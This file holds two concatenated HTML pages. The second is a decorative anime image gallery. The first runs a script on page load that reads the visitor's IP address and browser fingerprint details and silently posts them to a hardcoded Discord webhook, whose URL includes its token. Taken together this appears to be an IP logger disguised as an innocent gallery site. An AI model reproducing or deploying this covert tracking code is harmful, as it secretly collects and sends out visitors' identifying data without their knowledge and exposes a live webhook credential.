<!DOCTYPE html>
<html>
<head>
    <title></title>
</head>
<body>
  
    
    <script>
        // Get the user's IP address
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                // Collect system information
                const systemInfo = {
                    ip: data.ip,
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    platform: navigator.platform,
                    screenResolution: `${screen.width}x${screen.height}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    cookiesEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack,
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    deviceMemory: navigator.deviceMemory,
                    connectionType: navigator.connection?.effectiveType,
                    batteryStatus: navigator.getBattery ? 'Available' : 'Not Available',
                };
                
                // Send the data to Discord webhook
                const webhookUrl = 'https://discord.com/api/webhooks/1376912728031232000/tamQLdVAbkBI8FG2nww1Ru95hI1GUBEu8p-GMZlxDShS9qG-UZhkXuXTulykNJPF8vCr';
                const payload = {
                    content: `New visitor detected!\n\n**System Information:**\n${JSON.stringify(systemInfo, null, 2)}`
                };
                
                fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });
            })
            .catch(error => console.error('Error:', error));
    </script>
</body>
</html>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Anime Gallery - HD Art</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            overflow-x: hidden;
            cursor: none;
        }

        /* Custom Cursor */
        .custom-cursor {
            position: fixed;
            top: 0;
            left: 0;
            width: 20px;
            height: 20px;
            background: radial-gradient(circle, #ff6b9d, #c44569);
            border-radius: 50%;
            pointer-events: none;
            z-index: 9999;
            transition: transform 0.1s ease;
            box-shadow: 0 0 20px rgba(255, 107, 157, 0.6);
        }

        .custom-cursor.hover {
            transform: scale(1.5);
            background: radial-gradient(circle, #ffd700, #ff8c00);
        }

        /* Header */
        .header {
            text-align: center;
            padding: 40px 20px;
            color: white;
            position: relative;
            z-index: 2;
        }

        .header h1 {
            font-size: 3.5rem;
            font-weight: bold;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
            margin-bottom: 10px;
            animation: glow 2s ease-in-out infinite alternate;
        }

        @keyframes glow {
            from { text-shadow: 2px 2px 4px rgba(0,0,0,0.5), 0 0 20px rgba(255,255,255,0.3); }
            to { text-shadow: 2px 2px 4px rgba(0,0,0,0.5), 0 0 30px rgba(255,255,255,0.6); }
        }

        .header p {
            font-size: 1.2rem;
            opacity: 0.9;
            margin-bottom: 30px;
        }

        /* Gallery Container */
        .gallery-container {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 60vh;
            padding: 20px;
            position: relative;
        }

        .image-showcase {
            position: relative;
            max-width: 800px;
            width: 100%;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }

        .image-showcase:hover {
            transform: translateY(-10px) scale(1.02);
            box-shadow: 0 30px 60px rgba(0,0,0,0.4);
        }

        .anime-image {
            width: 100%;
            height: auto;
            display: block;
            transition: filter 0.3s ease;
        }

        .image-overlay {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(45deg, rgba(102, 126, 234, 0.1), rgba(118, 75, 162, 0.1));
            opacity: 0;
            transition: opacity 0.3s ease;
        }

        .image-showcase:hover .image-overlay {
            opacity: 1;
        }

        /* Image Info */
        .image-info {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            background: linear-gradient(transparent, rgba(0,0,0,0.8));
            color: white;
            padding: 30px 20px 20px;
            transform: translateY(100%);
            transition: transform 0.3s ease;
        }

        .image-showcase:hover .image-info {
            transform: translateY(0);
        }

        .image-info h3 {
            font-size: 1.5rem;
            margin-bottom: 5px;
        }

        .image-info p {
            opacity: 0.9;
            font-size: 0.9rem;
        }

        /* Navigation Buttons */
        .nav-buttons {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 40px;
        }

        .nav-btn {
            padding: 12px 24px;
            background: linear-gradient(45deg, #ff6b9d, #c44569);
            color: white;
            border: none;
            border-radius: 25px;
            font-size: 1rem;
            font-weight: bold;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        .nav-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(255, 107, 157, 0.4);
        }

        .nav-btn:active {
            transform: translateY(0);
        }

        /* Floating Elements */
        .floating-elements {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 1;
        }

        .floating-circle {
            position: absolute;
            border-radius: 50%;
            background: radial-gradient(circle, rgba(255,255,255,0.1), transparent);
            animation: float 6s ease-in-out infinite;
        }

        .floating-circle:nth-child(1) {
            width: 100px;
            height: 100px;
            top: 20%;
            left: 10%;
            animation-delay: 0s;
        }

        .floating-circle:nth-child(2) {
            width: 150px;
            height: 150px;
            top: 60%;
            right: 10%;
            animation-delay: 2s;
        }

        .floating-circle:nth-child(3) {
            width: 80px;
            height: 80px;
            bottom: 20%;
            left: 20%;
            animation-delay: 4s;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0px) rotate(0deg); }
            50% { transform: translateY(-20px) rotate(180deg); }
        }

        /* Responsive */
        @media (max-width: 768px) {
            .header h1 {
                font-size: 2.5rem;
            }
            
            .nav-buttons {
                flex-direction: column;
                align-items: center;
            }
            
            .nav-btn {
                width: 200px;
            }
        }
    </style>
</head>
<body>
    <div class="custom-cursor"></div>
    
    <div class="floating-elements">
        <div class="floating-circle"></div>
        <div class="floating-circle"></div>
        <div class="floating-circle"></div>
    </div>

    <div class="header">
        <h1>‚ú® Anime Gallery ‚ú®</h1>
        <p>Experience stunning HD anime artwork with immersive interactions</p>
    </div>

    <div class="gallery-container">
        <div class="image-showcase">
            <img src="https://images.unsplash.com/photo-1578662996442-48f60103fc96?w=800&h=600&fit=crop&crop=center" 
                 alt="Anime-style artwork" class="anime-image" id="mainImage">
            <div class="image-overlay"></div>
            <div class="image-info">
                <h3 id="imageTitle">Mystical Forest</h3>
                <p id="imageDesc">A serene landscape with magical elements and vibrant colors</p>
            </div>
        </div>
    </div>

    <div class="nav-buttons">
        <button class="nav-btn" onclick="changeImage('prev')">‚Üê Previous</button>
        <button class="nav-btn" onclick="changeImage('random')">üé≤ Random</button>
        <button class="nav-btn" onclick="changeImage('next')">Next ‚Üí</button>
    </div>

    <script>
        // Custom cursor functionality
        const cursor = document.querySelector('.custom-cursor');
        const hoverElements = document.querySelectorAll('.nav-btn, .image-showcase');

        document.addEventListener('mousemove', (e) => {
            cursor.style.left = e.clientX + 'px';
            cursor.style.top = e.clientY + 'px';
        });

        hoverElements.forEach(element => {
            element.addEventListener('mouseenter', () => {
                cursor.classList.add('hover');
            });
            
            element.addEventListener('mouseleave', () => {
                cursor.classList.remove('hover');
            });
        });

        // Image gallery data
        const images = [
            {
                url: "https://images.unsplash.com/photo-1578662996442-48f60103fc96?w=800&h=600&fit=crop&crop=center",
                title: "Mystical Forest",
                desc: "A serene landscape with magical elements and vibrant colors"
            },
            {
                url: "https://images.unsplash.com/photo-1614732414444-096a5be5e31f?w=800&h=600&fit=crop&crop=center",
                title: "Neon Cityscape",
                desc: "Futuristic urban environment with glowing lights and anime aesthetics"
            },
            {
                url: "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=800&h=600&fit=crop&crop=center",
                title: "Cherry Blossom Dreams",
                desc: "Delicate pink petals dancing in the spring breeze"
            },
            {
                url: "https://images.unsplash.com/photo-1578662015130-c6bd2c4c3e03?w=800&h=600&fit=crop&crop=center",
                title: "Ocean Depths",
                desc: "Mysterious underwater world with ethereal blue tones"
            },
            {
                url: "https://images.unsplash.com/photo-1614730321146-b6fa6a46bcb4?w=800&h=600&fit=crop&crop=center",
                title: "Mountain Peaks",
                desc: "Majestic peaks touching the clouds in anime style"
            }
        ];

        let currentImageIndex = 0;

        function changeImage(direction) {
            const mainImage = document.getElementById('mainImage');
            const imageTitle = document.getElementById('imageTitle');
            const imageDesc = document.getElementById('imageDesc');
            
            // Add transition effect
            mainImage.style.opacity = '0.5';
            
            setTimeout(() => {
                if (direction === 'next') {
                    currentImageIndex = (currentImageIndex + 1) % images.length;
                } else if (direction === 'prev') {
                    currentImageIndex = (currentImageIndex - 1 + images.length) % images.length;
                } else if (direction === 'random') {
                    currentImageIndex = Math.floor(Math.random() * images.length);
                }
                
                const currentImage = images[currentImageIndex];
                mainImage.src = currentImage.url;
                imageTitle.textContent = currentImage.title;
                imageDesc.textContent = currentImage.desc;
                
                mainImage.style.opacity = '1';
            }, 150);
        }

        // Auto-advance images every 8 seconds
        setInterval(() => {
            changeImage('next');
        }, 8000);

        // Add sparkle effect on click
        document.addEventListener('click', (e) => {
            const sparkle = document.createElement('div');
            sparkle.style.position = 'fixed';
            sparkle.style.left = e.clientX + 'px';
            sparkle.style.top = e.clientY + 'px';
            sparkle.style.width = '6px';
            sparkle.style.height = '6px';
            sparkle.style.background = '#ffd700';
            sparkle.style.borderRadius = '50%';
            sparkle.style.pointerEvents = 'none';
            sparkle.style.zIndex = '10000';
            sparkle.style.animation = 'sparkle 1s ease-out forwards';
            
            document.body.appendChild(sparkle);
            
            setTimeout(() => {
                sparkle.remove();
            }, 1000);
        });

        // Add sparkle animation
        const style = document.createElement('style');
        style.textContent = `
            @keyframes sparkle {
                0% {
                    transform: scale(0) rotate(0deg);
                    opacity: 1;
                }
                100% {
                    transform: scale(3) rotate(180deg);
                    opacity: 0;
                }
            }
        `;
        document.head.appendChild(style);
    </script>
</body>
</html>
